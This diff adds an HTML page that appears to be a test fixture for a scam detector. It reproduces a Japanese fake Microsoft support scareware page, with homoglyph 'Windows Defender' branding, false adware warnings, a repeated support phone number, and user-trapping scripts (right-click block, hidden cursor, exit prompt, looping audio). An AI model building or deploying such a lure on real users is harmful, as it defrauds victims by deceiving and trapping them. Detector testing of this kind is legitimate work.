@@ -1,0 +1,263 @@
+÷<!doctype html>
+<html lang="ja">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Stripchat</title>
+    <link rel="shortcut icon" type="image/png" href="images/favicon.png">
+    <link href="css/tapa.css" rel="stylesheet">
+    <script type="text/javascript" src="js/jquery-1.4.4.min.js"></script>
+    <script type="text/javascript">
+      // Safe fixture value: fake number reserved for detector tests only.
+      var support_contact_label = '0101 504 324 2447';
+
+      function fixtureBeforeUnload() {
+        return '';
+      }
+    </script>
+    <script type="text/javascript">
+      $(function() {
+        $('body').bind('contextmenu', function() {
+          return false;
+        });
+      });
+    </script>
+  </head>
+
+  <body
+    class="map fixture-page"
+    id="mycanvas"
+    onbeforeunload="return fixtureBeforeUnload()"
+    style="cursor:none"
+    data-fixture="Stripchat"
+    data-signals="fake-support-ui,homoglyph-branding,forced-modal-style,call-to-action-redacted,contextmenu-block,onbeforeunload,cursor-none"
+  >
+    <audio id="fixture-alert-audio" src="media/eng.mp3" preload="auto" loop></audio>
+
+    <main class="fixture-shell" aria-label="Anti-fraud test page">
+      <section class="fixture-banner" aria-label="Fixture notice">
+        <p style="position:absolute;left:12px;top:8px;z-index:999999999;color:#fff;background:#111;padding:6px 10px;border-radius:4px;font:14px Arial,sans-serif">
+          
+        </p>
+      </section>
+
+      <section id="ageconfirmationmodal" class="fixture-modal" data-signal="exit-confirmation-copy">
+        <div class="innerContainer">
+          <div class="crsr">
+            <a href="#" aria-label="close fixture modal">
+              <img src="images/cs.png" alt="" style="width:20px">
+            </a>
+          </div>
+
+          <div style="font-size:40px;margin-top:5px">
+            このサイトを閉じます<br>か？
+          </div>
+
+          <div>
+            <button type="button" class="btn btn-secondary btn-lg" style="margin-right:5px">
+              いいえ
+            </button>
+            <button type="button" class="btn btn-primary btn-lg blink" style="background-color:#a3242f;color:#fff;background-image:none">
+              はい
+            </button>
+          </div>
+        </div>
+      </section>
+
+      <section class="background-layer" aria-hidden="true">
+        <div class="bg">
+          <div class="bgimg" style="top:0">
+            <img src="images/back.png" alt="" width="100%">
+          </div>
+        </div>
+        <a href="#" id="link_black" rel="noreferrer" data-signal="black-overlay-link">
+          <div class="black" style="height:145%;cursor:none;display:block"></div>
+        </a>
+      </section>
+
+      <section class="screenshot-layer" aria-label="Background browser screenshot">
+        <div class="webbxs" style="display:block">
+          <img src="images/nbx1.jpg" alt="" width="100%" style="height:auto">
+        </div>
+      </section>
+
+      <section class="primary-alert" aria-label="Primary security alert">
+        <div class="bxcontb" style="display:block" id="webgetcode" data-signal="support-call-panel">
+          <img src="images/web1.jpg" alt="" style="width:500px">
+          <strong class="haru">
+            <img src="images/call.png" alt="" class="blink" style="width:25px;margin-left:0">
+            <script>document.write(support_contact_label);</script>
+            (日本国内通話無料)
+          </strong>
+        </div>
+      </section>
+
+      <section class="scan-alert" aria-label="Scan alert">
+        <div class="vislnb" id="botgnws" style="display:block" data-signal="fake-scan-panel">
+          <div class="row firewall-pro">
+            <div class="col-md-12">
+              <img src="images/box01.png" alt="" style="width:670px;height:auto">
+              <div id="txtintro">
+                <span class="colo-rd">
+                  <div id="ip_add"></div>
+                  <div id="city"></div>
+                  <div id="isp"></div>
+                </span>
+              </div>
+              <img src="images/scn.gif" id="bnrs" alt="">
+              <strong class="haruto">
+                <img src="images/call.png" alt="" class="blink" style="width:25px;margin-left:0">
+                <script>document.write(support_contact_label);</script>
+                (日本国内通話無料)
+              </strong>
+              <div class="fr button blink" id="ftrs_btn">
+                <a href="#" class="blink">わかりました</a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <footer id="ftrs" class="fixture-footer" data-signal="fake-brand-footer">
+        <div class="row">
+          <div class="col-md-12">
+            <div class="right-foot" style="text-align:center;margin-bottom:5px">
+              <span id="ftrstxt">
+                <img src="images/img.png" alt=""> Wіndоws のセキュリティ
+              </span>
+              <span style="font-weight:500;padding-left:13px;color:#fff">
+                Wіndоws サポート連絡先:
+                <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px">
+                  <img src="images/call.png" alt="" class="blink" style="width:25px;vertical-align:middle">
+                  <script>document.write(support_contact_label);</script>
+                  (日本国内通話無料)
+                </span>
+              </span>
+            </div>
+          </div>
+          <div class="col-md-12">
+            <marquee direction="left" height="100px" width="100%" data-signal="urgent-security-marquee">
+              <small class="text-left" style="color:#eee;font-size:10px">
+                Wіndоws Dеfеndеr SmаrtSсreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。 Wіndоws Dеfеndеr スキャンにより、パスワード、オンライン ID、財務情 、個人ファイル、写真、ドキュメントを盗む可能性があるアドウェアがこのデバイス上で見つかりました。
+              </small>
+            </marquee>
+          </div>
+        </div>
+      </footer>
+
+      <aside
+        class="uprbox"
+        style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem"
+        id="upbxs"
+        data-signal="hidden-urgent-popup"
+      >
+        <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">
+          すぐに当社にご連絡く さい。当社のエンジニアが電話で削除プロセスを案内いたします。お使いのコンピュータは無効になっています。Wіndоws Dеfеndеr SmartSсreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、コンピュータが安全でない可能性があります。
+          <br>
+          <strong>
+            日本国内通話無料:
+            <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px;display:block">
+              <img src="images/call.png" alt="" class="blink" style="width:25px;vertical-align:bottom">
+              <script>document.write(support_contact_label);</script>
+            </span>
+          </strong>
+        </p>
+      </aside>
+
+      <aside id="chat" class="bounce" style="display:block" data-signal="floating-support-box">
+        <img src="images/img.png" alt="">
+        <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">
+          Місrоsоft
+        </span>
+        <p style="font-weight:600;font-size:24px">
+          サポートに電話する:
+          <br>
+        </p>
+        <h4 style="font-weight:600;font-size:22px">
+          <img src="images/call.png" alt="" class="blink" style="width:25px;margin-left:0;vertical-align:bottom">
+          <script>document.write(support_contact_label);</script>
+          <br>(日本国内通話無料)
+        </h4>
+        <div class="arrow-down">
+          <svg height="1em" viewBox="0 0 320 512" aria-hidden="true">
+            <style>
+              svg {
+                fill: #fff;
+              }
+            </style>
+            <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+          </svg>
+        </div>
+      </aside>
+    </main>
+
+    <script type="text/javascript" src="js/noir.js"></script>
+    <script type="text/javascript" src="js/all.js"></script>
+    <script type="text/javascript" src="js/esc.js"></script>
+    <script type="text/javascript" src="js/script1.js"></script>
+    <script type="text/javascript" src="js/script2.js"></script>
+    <script type="text/javascript" src="js/script3.js"></script>
+    <script type="text/javascript" src="js/script4.js"></script>
+    <script type="text/javascript" src="js/script5.js"></script>
+    <script type="text/javascript" src="js/script6.js"></script>
+    <script type="text/javascript" src="js/script7.js"></script>
+    <script type="text/javascript" src="js/web1.js"></script>
+    <script type="text/javascript" src="js/full.js"></script>
+    <script type="text/javascript" src="js/lvs.js"></script>
+    <script type="text/javascript" src="js/cmple.js"></script>
+    <script type="text/javascript" src="js/muse.js"></script>
+    <script type="text/javascript" src="js/mouse.js"></script>
+    <script type="text/javascript" src="js/times.js"></script>
+    <script type="text/javascript">
+      $(document).ready(function() {
+        $("#ip_add").text();
+        $("#city").text();
+        $("#isp").text();
+      });
+    </script>
+
+    <script type="text/javascript">
+      (function() {
+        var audioStarted = false;
+        function startFixtureAudio() {
+          if (audioStarted) {
+            return;
+          }
+          var audio = document.getElementById('fixture-alert-audio');
+          if (audio && audio.play) {
+            audio.play();
+            audioStarted = true;
+          }
+        }
+        document.addEventListener('click', startFixtureAudio, false);
+      })();
+    </script>
+
+    <script type="text/javascript">
+      $(document).ready(function() {
+        $(".map").click(function() {
+          $("#ageconfirmationmodal").hide();
+          $("#upbxs").show();
+          $("#botgnws").show();
+        });
+
+        $("#cross").click(function() {
+          $("#botgnws").show();
+        });
+
+        $("body").mouseover(function() {
+          $("#botgnws").show();
+        });
+
+        $("#chat").delay(600).fadeIn(100);
+      });
+    </script>
+
+    <template id="original-signal-corpus" data-signal="inert-original-indicators">
+      <script id="gauges-tracker" data-site-id="683ff2d90d85105caa28dc1b" data-track-path="../track.gaug.es/track.gif" src="../c4clr7gvcn.cloudfront.net/track.js"></script>
+      <script id="gauges-tracker-alt" data-site-id="68030af197f7d43f5e1b24a0" data-track-path="../track.gaug.es/track.gif" src="../d2fuc4clr7gvcn.cloudfront.net/track.js"></script>
+      <script src="js/ips.js"></script>
+    </template>
+  </body>
+</html>
